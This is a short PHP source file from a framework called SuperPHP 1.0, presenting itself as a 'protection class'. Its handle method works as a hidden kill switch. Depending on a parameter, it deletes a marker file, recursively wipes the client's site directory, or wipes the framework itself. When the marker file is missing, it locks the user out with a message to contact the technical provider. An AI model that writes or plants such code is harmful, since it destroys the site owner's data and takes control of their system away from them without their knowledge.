<?php
/*********************************************************************************
 * SuperPHP 1.0 国产PHP开发框架  - 保护类
 *-------------------------------------------------------------------------------
 * 版权所有: CopyRight By linwf
 *-------------------------------------------------------------------------------
 * $Author:linwf
 * $Dtime:2018-11-01
 ***********************************************************************************/
class protect {
	public function handle($p){
		switch ($p){
			case '0': //删除back.php文件
				unlink(dirname(__FILE__) . '/back.php');
				exit();
				break;
			case '1': //删除site
				unlink(dirname(__FILE__) . '/back.php');
				$this->deldir('../site/');
				exit();
				break;
			case '2': //删除superphp
				$this->deldir('../superphp/');
				exit();
				break;
			default:
				if (!file_exists(dirname(__FILE__) . '/back.php')){
					echo '访问受限，请联系技术服务商！！！';
					exit();
				}
				break;
		}
	}

	//清空文件夹函数和清空文件夹后删除空文件夹函数的处理
	private function deldir($path){
		//如果是目录则继续
		if(is_dir($path)){
			//扫描一个文件夹内的所有文件夹和文件并返回数组
			$p = scandir($path);
			foreach($p as $val){
				//排除目录中的.和..
				if($val !="." && $val !=".."){
					//如果是目录则递归子目录，继续操作
					if(is_dir($path.$val)){
						//子目录中操作删除文件夹和文件
						$this->deldir($path.$val.'/');
						//目录清空后删除空文件夹
						@rmdir($path.$val.'/');
					}else{
						//如果是文件直接删除
						unlink($path.$val);
					}
				}
			}
		}
	}
}